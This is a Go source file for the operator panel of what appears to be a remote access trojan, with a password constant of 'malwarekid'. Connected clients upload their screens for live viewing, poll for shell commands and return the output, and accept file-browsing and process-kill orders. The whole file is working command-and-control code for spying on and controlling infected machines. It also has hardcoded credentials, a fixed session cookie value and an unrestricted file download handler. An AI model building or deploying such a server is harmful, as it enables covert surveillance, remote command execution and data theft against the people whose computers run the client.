package main

import (
	"embed"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"path/filepath"
	"strings"
	"sync"
	"strconv"
	"time"
)

const (
	username         = "admin"
	password         = "malwarekid"
	sessionCookie    = "screenstream-session"
	listenAddr       = ":8080"
	timeout          = 10 * time.Second
)

type Client struct {
	Frame     []byte
	Timestamp time.Time
	OS        string
	Version   string
}

type ShellCommand struct {
	Command string
}

type ShellResponse struct {
	Output string
}

type KillRequest struct {
	PID int `json:"pid"`
}

type FileInfo struct {
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	IsDir   bool   `json:"is_dir"`
	ModTime string `json:"mod_time"`
	Path    string `json:"path"`
}

type FileRequest struct {
	Action string `json:"action"`
	Path   string `json:"path"`
}

var (
	mu               sync.RWMutex
	clients          = make(map[string]*Client)
	commands         = make(map[string]string)
	responses        = make(map[string]string)
	commandHistory   = make(map[string]string)
	fileCommands     = make(map[string]FileRequest)
	fileResponses    = make(map[string][]FileInfo)
)

//go:embed templates/*
var templateFS embed.FS

var templates = template.Must(template.New("").Funcs(template.FuncMap{
	"formatSize": func(size int64) string {
		const unit = 1024
		if size < unit {
			return fmt.Sprintf("%d B", size)
		}
		div, exp := int64(unit), 0
		for n := size / unit; n >= unit; n /= unit {
			div *= unit
			exp++
		}
		return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
	},
}).ParseFS(templateFS, "templates/*.html"))

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		templates.ExecuteTemplate(w, "login.html", nil)
		return
	}
	r.ParseForm()
	if r.FormValue("username") == username && r.FormValue("password") == password {
		http.SetCookie(w, &http.Cookie{Name: sessionCookie, Value: "ok", Path: "/"})
		http.Redirect(w, r, "/", http.StatusFound)
	} else {
		templates.ExecuteTemplate(w, "login.html", map[string]string{"Error": "Invalid credentials"})
	}
}

func isAuthenticated(r *http.Request) bool {
	cookie, err := r.Cookie(sessionCookie)
	return err == nil && cookie.Value == "ok"
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	mu.RLock()
	defer mu.RUnlock()

	var clientsData []map[string]interface{}
	for id, c := range clients {
		status := "offline"
		statusClass := "offline"
		if time.Since(c.Timestamp) < timeout {
			status = "online"
			statusClass = "online"
		}

		clientsData = append(clientsData, map[string]interface{}{
			"ID":          id,
			"Status":      status,
			"StatusClass": statusClass,
			"OS":          c.OS,
			"Version":     c.Version,
		})
	}

	templates.ExecuteTemplate(w, "index.html", clientsData)
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	http.SetCookie(w, &http.Cookie{Name: sessionCookie, Value: "", Path: "/", MaxAge: -1})
	http.Redirect(w, r, "/login", http.StatusFound)
}

func viewerHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	client := r.URL.Query().Get("client")
	templates.ExecuteTemplate(w, "viewer.html", client)
}

func shellHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID is missing", http.StatusBadRequest)
		return
	}

	var output string
	clearRequested := r.FormValue("clear") == "1"

	if r.Method == http.MethodPost {
		if clearRequested {
			mu.Lock()
			commandHistory[clientID] = ""
			mu.Unlock()
		} else {
			cmd := r.FormValue("command")
			if cmd == "" {
				http.Error(w, "Command is empty", http.StatusBadRequest)
				return
			}

			mu.Lock()
			commands[clientID] = cmd
			mu.Unlock()

			// Wait for response with timeout
			timeout := time.After(10 * time.Second)
			ticker := time.NewTicker(500 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-timeout:
					output = "Command timed out"
					goto done
				case <-ticker.C:
					mu.RLock()
					if resp, exists := responses[clientID]; exists && resp != "" {
						output = resp
						responses[clientID] = ""
						mu.RUnlock()
						goto done
					}
					mu.RUnlock()
				}
			}

		done:
			if output == "" {
				output = "No output from command"
			}

			entry := fmt.Sprintf("> %s\n%s\n", cmd, output)
			mu.Lock()
			commandHistory[clientID] += entry
			mu.Unlock()
		}
	}

	mu.RLock()
	history := commandHistory[clientID]
	mu.RUnlock()

	templates.ExecuteTemplate(w, "shell.html", map[string]interface{}{
		"ClientID": clientID,
		"History":  history,
	})
}

func filesHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID is missing", http.StatusBadRequest)
		return
	}

	var files []FileInfo
	currentPath := r.FormValue("path")
	if currentPath == "" {
		currentPath = "/"
	}

	if r.Method == http.MethodPost {
		action := r.FormValue("action")
		path := r.FormValue("path")

		mu.Lock()
		fileCommands[clientID] = FileRequest{Action: action, Path: path}
		mu.Unlock()

		// Wait for response
		timeout := time.After(10 * time.Second)
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()

		for {
			select {
			case <-timeout:
				break
			case <-ticker.C:
				mu.RLock()
				if resp, exists := fileResponses[clientID]; exists {
					files = resp
					delete(fileResponses, clientID)
					mu.RUnlock()
					goto render
				}
				mu.RUnlock()
			}
		}
	}

render:
	templates.ExecuteTemplate(w, "files.html", map[string]interface{}{
		"ClientID":    clientID,
		"Files":       files,
		"CurrentPath": currentPath,
	})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	// Check if this is system info
	if r.Header.Get("Content-Type") == "application/json" {
		var info map[string]string
		body, _ := io.ReadAll(r.Body)
		json.Unmarshal(body, &info)
		
		mu.Lock()
		if client, exists := clients[clientID]; exists {
			client.OS = info["os"]
			client.Version = info["version"]
			client.Timestamp = time.Now()
		} else {
			clients[clientID] = &Client{
				OS:        info["os"],
				Version:   info["version"],
				Timestamp: time.Now(),
			}
		}
		mu.Unlock()
		return
	}

	img, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("Read error:", err)
		return
	}
	mu.Lock()
	if client, exists := clients[clientID]; exists {
		client.Frame = img
		client.Timestamp = time.Now()
	} else {
		clients[clientID] = &Client{Frame: img, Timestamp: time.Now()}
	}
	mu.Unlock()
}

func streamHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	clientID := r.URL.Query().Get("client")
	w.Header().Set("Content-Type", "multipart/x-mixed-replace; boundary=frame")
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported!", http.StatusInternalServerError)
		return
	}
	
	for {
		mu.RLock()
		client, exists := clients[clientID]
		mu.RUnlock()
		if !exists || time.Since(client.Timestamp) > timeout {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		if client.Frame != nil {
			fmt.Fprintf(w, "--frame\r\nContent-Type: image/jpeg\r\nContent-Length: %d\r\n\r\n", len(client.Frame))
			w.Write(client.Frame)
			fmt.Fprintf(w, "\r\n")
			flusher.Flush()
		}
		time.Sleep(66 * time.Millisecond)
	}
}

func commandPollHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	mu.Lock()
	defer mu.Unlock()
	cmd := commands[clientID]
	commands[clientID] = ""
	json.NewEncoder(w).Encode(ShellCommand{Command: cmd})
}

func commandResultHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	var result ShellResponse
	body, _ := ioutil.ReadAll(r.Body)
	json.Unmarshal(body, &result)
	mu.Lock()
	responses[clientID] = result.Output
	mu.Unlock()
}

func filePollHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	mu.Lock()
	defer mu.Unlock()
	
	if req, exists := fileCommands[clientID]; exists {
		delete(fileCommands, clientID)
		json.NewEncoder(w).Encode(req)
	} else {
		json.NewEncoder(w).Encode(FileRequest{})
	}
}

func fileResultHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	var result []FileInfo
	body, _ := ioutil.ReadAll(r.Body)
	json.Unmarshal(body, &result)
	mu.Lock()
	fileResponses[clientID] = result
	mu.Unlock()
}

func processPollHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	mu.Lock()
	cmd := commands[clientID+"_proc"]
	commands[clientID+"_proc"] = ""
	mu.Unlock()
	json.NewEncoder(w).Encode(map[string]string{"command": cmd})
}

func processResultHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	var result map[string]string
	body, _ := ioutil.ReadAll(r.Body)
	json.Unmarshal(body, &result)

	mu.Lock()
	responses[clientID+"_proc"] = result["output"]
	mu.Unlock()
}

func processHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	var output string
	var action string

	if r.Method == http.MethodPost {
		action = r.FormValue("action")

		if action == "refresh" {
			mu.Lock()
			commands[clientID+"_proc"] = "list"
			mu.Unlock()
			time.Sleep(2 * time.Second)
		}

		if action == "kill" {
			pid := r.FormValue("pid")
			if pid != "" {
				log.Printf("Request to kill PID %s for client %s\n", pid, clientID)
				mu.Lock()
				commands[clientID+"_kill"] = pid
				mu.Unlock()
				time.Sleep(2 * time.Second)
			}
		}
	}

	mu.RLock()
	output = responses[clientID+"_proc"]
	mu.RUnlock()

	var processes []map[string]string
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			processes = append(processes, map[string]string{
				"PID":  fields[0],
				"Name": strings.Join(fields[1:], " "),
			})
		}
	}

	templates.ExecuteTemplate(w, "processes.html", map[string]interface{}{
		"ClientID":  clientID,
		"Processes": processes,
	})
}

func processDataHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	// Request fresh process list from client
	mu.Lock()
	commands[clientID+"_proc"] = "list"
	mu.Unlock()
	time.Sleep(2 * time.Second) // Give client time to respond

	mu.RLock()
	output := responses[clientID+"_proc"]
	mu.RUnlock()

	var processes []map[string]string
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			processes = append(processes, map[string]string{
				"PID":  fields[0],
				"Name": strings.Join(fields[1:], " "),
			})
		}
	}

	// Output only the table rows
	for _, p := range processes {
		fmt.Fprintf(w, `
		<tr>
			<td>%s</td>
			<td>%s</td>
			<td>
				<form method="POST" style="margin: 0;">
					<input type="hidden" name="action" value="kill">
					<input type="hidden" name="pid" value="%s">
					<button type="submit" class="kill-btn">Kill</button>
				</form>
			</td>
		</tr>`, p["PID"], p["Name"], p["PID"])
	}
}

func killHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	mu.Lock()
	pid := commands[clientID+"_kill"]
	commands[clientID+"_kill"] = ""
	mu.Unlock()

	pidInt, _ := strconv.Atoi(pid)
	resp := KillRequest{PID: pidInt}
	json.NewEncoder(w).Encode(resp)
}

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	
	filename := r.URL.Query().Get("file")
	if filename == "" {
		http.Error(w, "Missing filename", http.StatusBadRequest)
		return
	}
	
	// Security: prevent directory traversal
	if strings.Contains(filename, "..") {
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}
	
	w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(filename))
	http.ServeFile(w, r, filename)
}

func main() {

	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/logout", logoutHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/stream", streamHandler)
	http.HandleFunc("/viewer", viewerHandler)
	http.HandleFunc("/shell", shellHandler)
	http.HandleFunc("/files", filesHandler)
	http.HandleFunc("/cmd/poll", commandPollHandler)
	http.HandleFunc("/cmd/result", commandResultHandler)
	http.HandleFunc("/file/poll", filePollHandler)
	http.HandleFunc("/file/result", fileResultHandler)
	http.HandleFunc("/processes", processHandler)
	http.HandleFunc("/processes/data", processDataHandler)
	http.HandleFunc("/proc/poll", processPollHandler)
	http.HandleFunc("/proc/result", processResultHandler)
	http.HandleFunc("/kill", killHandler)
	http.HandleFunc("/download", downloadHandler)

	log.Printf("SysX server running on %s", listenAddr)
	log.Printf("Default credentials: %s / %s", username, password)
	log.Fatal(http.ListenAndServe(listenAddr, nil))
}